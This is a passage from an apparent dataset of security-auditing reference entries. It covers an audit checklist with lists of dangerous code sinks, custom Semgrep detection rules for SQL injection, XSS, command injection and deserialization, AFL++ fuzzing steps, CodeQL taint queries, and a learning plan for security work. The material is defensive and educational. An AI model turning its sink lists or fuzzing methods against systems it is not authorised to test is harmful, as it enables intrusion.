     T — tampering with data (CSRF, IDOR)
     R — repudiation (logging)
     I — information disclosure
     D — denial of service
     E — elevation of privilege

4. AUTOMATED SCAN — let the tools do first pass:
     semgrep --config auto .
     semgrep --config p/security-audit --config p/owasp-top-ten .
     bandit -r . (Python)
     gosec ./... (Go)
     brakeman (Rails)
     CodeQL (most languages — github.com/github/codeql)

5. MANUAL — taint-track the dangerous sinks. Open every result and
   trace user-input → sink. Common sink lists:
   RCE:           eval / exec / system / shell_exec / Runtime.exec /
                  child_process.exec / Function() / setTimeout(string)
   SQLi:          raw concat into query, query.format(input)
   File:          open / fopen / readFileSync / fs.* with user input
   Network:       http.get / requests.get with user URL
   XSS:           dangerouslySetInnerHTML, innerHTML = input,
                  document.write, render(input), template engines with
                  autoescape off.
   SSRF:          fetch / urllib.request / requests.get(url) with user URL.
   Deserialize:   pickle, yaml.load (not safe_load), Marshal.load,
                  ObjectInputStream, xstream, json.loads of class hint.
   Auth:          jwt.decode without options.verify, bcrypt skip,
                  session secret hard-coded.
   Crypto:        MD5/SHA-1 for passwords, ECB mode, hardcoded IVs/keys,
                  custom \"encryption\".
   Race:          read-modify-write on shared state without lock /
                  transaction.

6. AUTHN/AUTHZ — every route, every method, who can call this?
   Look for missing decorator (@login_required, @authorize), missing
   row-level check (own-resource), missing tenant scoping (multi-tenant
   apps).

7. CONFIG + SECRETS
   Hardcoded creds (gitleaks / trufflehog / kingfisher).
   Insecure defaults (DEBUG=true, ALLOWED_HOSTS=['*']).
   Weak session config (httpOnly missing, sameSite none, secret exposed).

8. WRITE FINDINGS as you go — don't trust your memory. One issue per
   finding, with file:line, code snippet, impact, suggested fix.

9. DON'T FORGET INFRA-AS-CODE — Terraform, K8s manifests, Helm charts,
   Dockerfiles. Public buckets, missing networkpolicy, container running
   as root, image pulled by tag (not digest).

10. PRIORITIZE for the report:
    Critical: pre-auth RCE, auth bypass, IDOR with PII, SQL injection
    High:     post-auth RCE, SSRF to metadata, hardcoded prod secret
    Medium:   reflected XSS, CSRF on sensitive action
    Low:      missing security header, info disclosure (low-impact)""",
},
{
    "request": "Semgrep — writing custom rules to find bugs",
    "language": "yaml", "framework": "appsec-audit",
    "code": """# Semgrep rules are YAML pattern matchers. Each finds one class of bug.

# Example 1 — Python: detect raw SQL string formatting
rules:
  - id: python-raw-sql-format
    message: \"User input concatenated into SQL — use parameterized queries\"
    severity: ERROR
    languages: [python]
    patterns:
      - pattern-either:
          - pattern: $CURSOR.execute(f\"...{$X}...\")
          - pattern: $CURSOR.execute(\"...\" + $X + \"...\")
          - pattern: $CURSOR.execute(\"...\".format($X))
          - pattern: $CURSOR.execute(\"...%s...\" % $X)
    metadata:
      cwe: CWE-89

# Example 2 — JavaScript: dangerous innerHTML with user data
  - id: js-dangerous-innerhtml
    message: \"User-controlled value assigned to innerHTML — possible XSS\"
    severity: ERROR
    languages: [javascript, typescript]
    pattern-either:
      - pattern: $E.innerHTML = $REQ.body.$X
      - pattern: $E.innerHTML = $REQ.query.$X
      - pattern: $E.innerHTML = $REQ.params.$X

# Example 3 — Go: command injection via os/exec
  - id: go-cmd-injection
    message: \"User input flowed into exec.Command — shell injection risk\"
    severity: ERROR
    languages: [go]
    pattern-either:
      - pattern: exec.Command(\"sh\", \"-c\", $X + ...)
      - pattern: |
          $CMD := fmt.Sprintf(\"...%s...\", $X)
          ...
          exec.Command(\"sh\", \"-c\", $CMD)

# Example 4 — Java: insecure deserialization
  - id: java-readobject
    message: \"ObjectInputStream.readObject on untrusted input — RCE risk\"
    severity: ERROR
    languages: [java]
    pattern: |
      $OIS = new ObjectInputStream(...);
      ...
      $OIS.readObject();

# RUN
#   semgrep --config myrules.yaml ./src
#   semgrep --config p/security-audit --config myrules.yaml ./src
#   semgrep --sarif --config myrules.yaml -o report.sarif

# REGISTRY OF GOOD STARTING POINTS
#   p/security-audit          — broad
#   p/owasp-top-ten           — curated
#   p/secrets                 — secret scanning
#   p/r2c-security-audit      — r2c team's curated set
#   p/ci                      — CI-friendly subset

# WRITE-YOUR-OWN TIPS
#   Use metavariable-pattern for cross-statement flow.
#   Use focus-metavariable to highlight just the dangerous bit.
#   Use taint mode (mode: taint) for proper source→sink tracking.
#   Test rules with --test flag and a fixtures file.""",
},
{
    "request": "AFL++ fuzzing — instrument and fuzz a parser",
    "language": "bash", "framework": "fuzzing",
    "code": """# AFL++ — coverage-guided fuzzer. Best for parsers, decoders, file format
# handlers, anything that takes structured bytes as input.

# 1. INSTALL
sudo apt install afl++   # or build from github.com/AFLplusplus/AFLplusplus

# 2. INSTRUMENT THE TARGET
# Recompile with afl-clang-fast++ (or afl-clang-fast for C):
CC=afl-clang-fast CXX=afl-clang-fast++ \\
   AFL_USE_ASAN=1 ./configure
make

# AFL_USE_ASAN=1 catches memory bugs at runtime. Slower (~2x) but well
# worth it — crashes that ASAN catches would otherwise look like \"works fine\".

# 3. PREPARE A SEED CORPUS
mkdir corpus
# Drop in real-world example inputs — actual files of the type the parser
# expects. Smaller is better (<1KB each). 5-50 seeds is plenty.

# 4. RUN
mkdir crashes
afl-fuzz -i corpus -o crashes -- ./target @@
# @@ becomes the path of the input file each iteration.

# 5. PARALLEL
# Master:
afl-fuzz -i corpus -o crashes -M master -- ./target @@
# Slaves (start as many as you have cores):
afl-fuzz -i corpus -o crashes -S slave1 -- ./target @@
afl-fuzz -i corpus -o crashes -S slave2 -- ./target @@

# 6. POWER MODES (huge speedup)
afl-fuzz -i corpus -o crashes -p explore -- ./target @@
# Other schedules: fast, coe, lin, quad, exploit, mmopt, rare.

# 7. CMPLOG — bypass magic-byte / checksum gating
CC=afl-clang-fast++ AFL_USE_ASAN=1 ./configure
afl-clang-fast++ -o target_cmplog -DAFL_CMPLOG=1 ...
afl-fuzz -c ./target_cmplog -- ./target @@

# 8. TRIAGE
ls crashes/default/crashes/    # crash inputs
afl-tmin -i crashes/...id1 -o min1 -- ./target @@   # minimize input
afl-cmin -i corpus -o min_corpus -- ./target @@      # minimize corpus

# 9. RECOMPILE WITH UBSAN/MSAN to catch more bug classes
AFL_USE_UBSAN=1 ...    # undefined behavior
AFL_USE_MSAN=1 ...     # uninit reads (slower but devastating)

# 10. STRUCTURED FUZZING for non-bytestream input (JSON, protobuf, etc.):
#  - LibProtoBufMutator (pair AFL++ or libFuzzer with protobuf grammar)
#  - Atheris (Python coverage fuzzer; google/atheris)
#  - Jazzer (JVM)

# Targets that have paid off historically: file parsers, decoders, codecs,
# scanners, networking stacks, anything that reads attacker-shaped bytes.""",
},
{
    "request": "CodeQL — query a codebase for vulnerable patterns",
    "language": "text", "framework": "appsec-audit",
    "code": """CodeQL = treat code as a database, write queries (in QL) to find bug
patterns. Best in class for cross-procedural taint analysis.

INSTALL
  brew install codeql                          # or download from github.com
  codeql resolve languages

CREATE A DATABASE for a project
  cd ~/code/target
  codeql database create db --language=java
  codeql database create db --language=javascript
  codeql database create db --language=python
  codeql database create db --language=go
  # multi-lang:
  codeql database create db --language=java --language=javascript

RUN A SUITE
  codeql database analyze db --format=sarif-latest \\
        --output=results.sarif \\
        codeql/java-queries:codeql-suites/java-security-extended.qls
  # Suites available: code-scanning, security-extended, security-and-quality.

INSPECT IN VS CODE
  Install \"CodeQL\" extension. Open the database. Right-click → query.
  Built-in queries are excellent starting templates.

EXAMPLE QUERY — find Spring controllers with missing CSRF:
  import java
  import semmle.code.java.frameworks.spring.SpringController
  from SpringController c
  where not exists(SpringControllerCsrfProtection p | p.protects(c))
  select c, \"Controller without CSRF protection\"

REAL POWER — TAINT TRACKING
  /**
   * @kind path-problem
   */
  import java
  import semmle.code.java.dataflow.TaintTracking

  class HttpToExec extends TaintTracking::Configuration {
    HttpToExec() { this = \"http to exec\" }
    override predicate isSource(DataFlow::Node n) {
      n.asExpr() instanceof HttpServletRequestExpr
    }
    override predicate isSink(DataFlow::Node n) {
      exists(MethodAccess m | m.getMethod().hasName(\"exec\") |
        n.asExpr() = m.getAnArgument())
    }
  }
  from HttpToExec cfg, DataFlow::PathNode source, DataFlow::PathNode sink
  where cfg.hasFlowPath(source, sink)
  select sink, source, sink, \"User input flows from $@ to exec\", source

WHEN TO USE
  - Crown-jewel app pre-launch.
  - Recurring audit (CI integration via GitHub Code Scanning).
  - Hunting a known CVE pattern across an org's codebase.

LEARN MORE
  - codeql.github.com/docs/
  - github.com/github/securitylab — published research queries
  - codeql-bountyhunting/* repos — community queries for bug bounty.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# OPSEC + LEARNING PATH
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "elite path — what to actually practice each week",
    "language": "text", "framework": "career",
    "code": """A path that turns curiosity into actual skill, ranked by leverage:

DAILY (~30 min)
  - Read one writeup. HackerOne hacktivity (sort by bounty), Pentesterland
    weekly newsletter, /r/netsec rising, watchTowr Labs blog.
  - Solve one PortSwigger Web Academy lab. 200+ free, sequenced, real.

WEEKLY
  - Box on HackTheBox (or TryHackMe room). Do without writeup first; read
    after to see what you missed.
  - One CTF challenge in a category you're weakest at — pwn, reverse,
    crypto. ctftime.org has a constant flow; archives are unlimited.
  - One CVE deep dive. Pick a recent critical CVE (kev catalog from CISA),
    read the patch diff, write your own PoC if it's in your stack.

MONTHLY
  - Build something. A wrapper around a tool, a custom nuclei template, a
    CTF challenge for others, a Burp extension, a CodeQL query, a detection
    rule. Forces depth.
  - Submit a bug to a public bounty program. Even when you don't earn,
    you'll learn the gap between \"I see the bug\" and \"I have impact\".
  - Read one chapter of a foundational book — Dowd's Art of Software
    Security Assessment, the Tangled Web, Real-World Cryptography.

QUARTERLY
  - Pick a stack you don't know and audit a small open-source project in
    it. Submitting findings forces real depth.
  - Skip-level: try a domain you've avoided. Mobile if you're web-only.
    Cloud if you're AD-only. Crypto if you're appsec-only.

YEAR ONE TARGET
  - Top 50% on every CTF you enter (helps measure progress).
  - 1+ medium-or-higher bounty submitted.
  - 1+ CVE filed (or co-discovered).
  - You can read assembly fluently, even if not write fluent ROP.

YEAR TWO TARGET
  - Routine top 20% on quality CTFs.
  - 5+ accepted bounty reports.
  - Custom tooling that you actually use (not abandoned scripts).
  - Domain specialization picked: web, mobile, cloud, AD, RE, crypto.

DON'T DO
  - Cert chasing without practice — OSCP without hands-on practice is wasted.
  - YouTube in place of doing — watching is 10% the value of solving.
  - Tools-only — \"I run nuclei, sqlmap, ffuf\" doesn't teach how a bug works.
  - Writeup-driven solving — read AFTER, not BEFORE you give it real time.
  - Paranoid OPSEC theatre when nothing's at stake — practice the stack
    you'll actually use, not 7 layers of VPN for nothing.""",
},

]
